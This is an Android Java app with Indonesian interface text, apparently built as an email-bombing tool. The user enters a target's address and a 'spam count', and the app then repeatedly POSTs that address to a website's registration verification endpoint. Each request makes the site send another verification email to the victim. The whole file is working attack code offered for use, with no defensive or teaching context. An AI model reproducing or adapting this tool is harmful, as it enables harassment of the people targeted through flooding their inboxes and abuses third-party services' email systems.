package com.uncheck.email;

import android.app.Activity;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.view.View;
import android.widget.Button;
import android.widget.EditText;
import android.widget.LinearLayout;
import android.widget.TextView;

import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.charset.StandardCharsets;

public class MainActivity extends Activity {
    Handler handler = new Handler(Looper.getMainLooper());

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        
        LinearLayout layout = new LinearLayout(this);
        layout.setOrientation(LinearLayout.VERTICAL);
        layout.setPadding(50, 50, 50, 50);

        final EditText etEmail = new EditText(this);
        etEmail.setHint("Email Target (cth: target@gmail.com)");
        layout.addView(etEmail);

        final EditText etCount = new EditText(this);
        etCount.setHint("Jumlah Spam (cth: 10)");
        layout.addView(etCount);

        Button btn = new Button(this);
        btn.setText("TEMBAK EMAIL!");
        layout.addView(btn);

        final TextView tvLog = new TextView(this);
        layout.addView(tvLog);

        setContentView(layout);

        btn.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                String targetEmail = etEmail.getText().toString();
                String countStr = etCount.getText().toString();
                if(targetEmail.isEmpty() || countStr.isEmpty()) return;
                
                int jumlah = Integer.parseInt(countStr);
                tvLog.setText("Memulai proses...\n");
                
                new Thread(() -> {
                    for (int i = 1; i <= jumlah; i++) {
                        final int loop = i;
                        String response = sendEmailRequest(targetEmail);
                        handler.post(() -> tvLog.append("[" + loop + "] " + response + "\n"));
                        
                        try { Thread.sleep(500); } catch (InterruptedException e) {}
                    }
                    handler.post(() -> tvLog.append("\n[*] SELESAI!"));
                }).start();
            }
        });
    }

    private String sendEmailRequest(String email) {
        try {
            URL url = new URL("https://api.contoh-website.com/api/v1/send-verification"); 
            
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("POST");
            conn.setRequestProperty("Content-Type", "application/json; utf-8");
            conn.setDoOutput(true);

            String jsonInputString = "{\"email\": \"" + email + "\", \"type\": \"register\"}";

            try(OutputStream os = conn.getOutputStream()) {
                byte[] input = jsonInputString.getBytes(StandardCharsets.UTF_8);
                os.write(input, 0, input.length);           
            }

            int code = conn.getResponseCode();
            return (code == 200 || code == 201) ? "SUKSES (" + code + ")" : "GAGAL (" + code + ")";

        } catch (Exception e) {
            return "ERROR JARINGAN";
        }
    }
}
